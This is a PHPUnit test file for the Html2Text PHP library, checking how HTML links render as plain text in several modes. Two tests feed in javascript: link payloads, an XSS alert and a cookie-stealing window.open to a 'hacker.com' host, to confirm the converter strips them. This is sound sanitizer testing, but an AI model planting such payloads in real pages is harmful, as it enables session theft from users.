<?php

namespace voku\Html2Text\tests;

use voku\Html2Text\Html2Text;

/**
 * Class LinkTest
 *
 * @package Html2Text
 */
class LinkTest extends \PHPUnit_Framework_TestCase
{
  const TEST_HTML = '
  <span>foo</span><a href="http://example.com?guid=[[PALCEHOLDER]]&foo=bar&{{foobar}}">Link text</a><span>bar...</span>
  <br /><br />
  <a href="http://example.com">Link text</a>
  <br /><br />
  <a href="mailto:fritz.eierschale@example.org">Fritz Eierschale, fritz.eierschale@example.org</a>
  ';

  public function testDoLinksAfter()
  {
    $expected = <<<EOT
foo Link text [1] bar...

Link text [2]

Fritz Eierschale, fritz.eierschale@example.org

Links:
------
[1] http://example.com?guid=[[PALCEHOLDER]]&foo=bar&{{foobar}}
[2] http://example.com
EOT;

    $html2text = new Html2Text(self::TEST_HTML, array('do_links' => 'table'));
    $output = $html2text->getText();

    self::assertSame($this->normalizeString($expected), $output);
  }

  public function testDoLinksInline()
  {
    $expected = <<<EOT
foo Link text [http://example.com?guid=[[PALCEHOLDER]]&foo=bar&{{foobar}}] bar...

Link text [http://example.com]

Fritz Eierschale, fritz.eierschale@example.org
EOT;

    $html2text = new Html2Text(self::TEST_HTML, array('do_links' => 'inline'));
    $output = $html2text->getText();

    self::assertSame($this->normalizeString($expected), $output);
  }

  public function testDoLinksBBCode()
  {
    $expected = <<<EOT
foo [url=http://example.com?guid=[[PALCEHOLDER]]&foo=bar&{{foobar}}]Link text[/url] bar...

[url=http://example.com]Link text[/url]

Fritz Eierschale, fritz.eierschale@example.org
EOT;

    $html2text = new Html2Text(self::TEST_HTML, array('do_links' => 'bbcode'));
    $output = $html2text->getText();

    self::assertSame($this->normalizeString($expected), $output);
  }

  public function testDoLinksNone()
  {
    $expected = <<<EOT
foo Link text bar...

Link text

Fritz Eierschale, fritz.eierschale@example.org
EOT;

    $html2text = new Html2Text(self::TEST_HTML, array('do_links' => 'none'));
    $output = $html2text->getText();

    self::assertSame($this->normalizeString($expected), $output);
  }

  public function testDoLinksNextline()
  {
    $expected = <<<EOT
foo Link text
[http://example.com?guid=[[PALCEHOLDER]]&foo=bar&{{foobar}}] bar...

Link text
[http://example.com]

Fritz Eierschale, fritz.eierschale@example.org
EOT;

    $html2text = new Html2Text(self::TEST_HTML, array('do_links' => 'nextline'));
    $output = $html2text->getText();

    self::assertSame($this->normalizeString($expected), $output);
  }

  public function testDoLinksInHtmlTable()
  {
    $html = <<<EOT
<p><a href="http://foo.com" class="_html2text_link_inline">Link text lall</a></p>
<p><a href="http://lall.com" class="foo">Link text lall</a></p>
<p><a href="http://lall.com" class="bar">Link text lall</a></p>
<p><a href="http://lall.com" class="_html2text_link_inline">Link text lall</a></p>
<p><a href="http://lall.com" class="_html2text_link_inline">Link text lall</a></p>
<p><a href="http://example.com" class="_html2text_link_none">Link text</a></p>
<p><a href="http://example.com" class="_html2text_link_inline">Link text</a></p>
<p><a href="http://example.com" class="_html2text_link_nextline">Link text</a></p>
EOT;

    $expected = <<<EOT
Link text lall [http://foo.com]

Link text lall [1]

Link text lall [1]

Link text lall [http://lall.com]

Link text lall [http://lall.com]

Link text

Link text [http://example.com]

Link text
[http://example.com]

Links:
------
[1] http://lall.com
EOT;

    $html2text = new Html2Text($html, array('do_links' => 'table'));
    $output = $html2text->getText();

    self::assertSame($this->normalizeString($expected), $output);
  }

  public function testDoLinksInHtml()
  {
    $html = <<<EOT
<p><a href="http://foo.com" class="_html2text_link_inline">Link text lall</a></p>
<p><a href="http://lall.com" class="_html2text_link_inline">Link text lall</a></p>
<p><a href="http://lall.com" class="_html2text_link_inline">Link text lall</a></p>
<p><a href="http://example.com" class="_html2text_link_none">Link text</a></p>
<p><a href="http://example.com" class="_html2text_link_inline">Link text</a></p>
<p><a href="http://example.com" class="_html2text_link_nextline">Link text</a></p>
EOT;

    $expected = <<<EOT
Link text lall [http://foo.com]

Link text lall [http://lall.com]

Link text lall [http://lall.com]

Link text

Link text [http://example.com]

Link text
[http://example.com]
EOT;

    $html2text = new Html2Text($html);
    $output = $html2text->getText();

    self::assertSame($this->normalizeString($expected), $output);
  }

  public function testBaseUrl()
  {
    $html = '<a href="/relative">Link text</a>';
    $expected = 'Link text [http://example.com/relative]';

    $html2text = new Html2Text($html, array('do_links' => 'inline'));
    $html2text->setBaseUrl('http://example.com');

    self::assertSame($expected, $html2text->getText());
  }

  public function testBaseUrlOld()
  {
    $html = '<a href="/relative">Link text</a>';
    $expected = 'Link text [http://example.com/relative]';

    $html2text = new Html2Text($html, array('do_links' => 'inline'));
    $html2text->set_base_url('http://example.com');

    self::assertSame($expected, $html2text->getText());
  }

  public function testIgnoredLinkTypes()
  {
    $html = '
    <a href="javascript:alert(\'XSS\')">XSS</a>
    <br />
    <a href="mailto:foo.bar@example.org">Foo Bar Example, foo.bar@example.org</a>
    <br />
    <a href="#">Link text</a>
    <br />
    <a href="/">Link text</a>
    ';
    $expected = 'XSS
Foo Bar Example, foo.bar@example.org
Link text
Link text [/]';

    $html2text = new Html2Text($html, array('do_links' => 'inline'));

    self::assertSame($this->normalizeString($expected), $html2text->getText());
  }

  public function testBaseUrlWithPlaceholder()
  {
    $html = '<a href="/relative">Link text</a>';
    $expected = 'Link text [%baseurl%/relative]';

    $html2text = new Html2Text($html, array('do_links' => 'inline'));
    $html2text->setBaseUrl('%baseurl%');

    self::assertSame($expected, $html2text->getText());
  }

  public function testBoldLinks()
  {
    $html = '<b><a href="http://example.com">Link text</a></b>';
    $expected = 'LINK TEXT [http://example.com]';

    $html2text = new Html2Text($html, array('do_links' => 'inline'));

    self::assertSame($expected, $html2text->getText());
  }

  public function testInvertedBoldLinks()
  {
    $html = '<a href="http://example.com"><b>Link text</b></a>';
    $expected = 'LINK TEXT [http://example.com]';

    $html2text = new Html2Text($html, array('do_links' => 'inline'));

    self::assertSame($expected, $html2text->getText());
  }

  public function testBrokenLink()
  {
    $html = '<ahref="#">Broken Link text</a>';
    $expected = 'Broken Link text';

    $html2text = new Html2Text($html, array('do_links' => 'inline'));

    self::assertSame($expected, $html2text->getText());
  }

  public function testJavascriptSanitizing()
  {
    $html = '<a href="javascript:window.open(\'http://hacker.com?cookie=\'+document.cookie)">Link text</a>';
    $expected = 'Link text';

    $html2text = new Html2Text($html, array('do_links' => 'inline'));

    self::assertSame($expected, $html2text->getText());
  }

  public function testDoLinksWhenTargetInText()
  {
    $html = '<a href="http://example.com">http://example.com</a>';
    $expected = 'http://example.com';
    $html2text = new Html2Text($html, array('do_links' => 'inline'));
    $this->assertEquals($expected, $html2text->getText());
    $html2text = new Html2Text($html, array('do_links' => 'nextline'));
    $this->assertEquals($expected, $html2text->getText());
  }

  /**
   * @param string $string
   *
   * @return string
   */
  protected function normalizeString($string)
  {
    return str_replace(array("\r\n", "\r"), "\n", $string);
  }
}
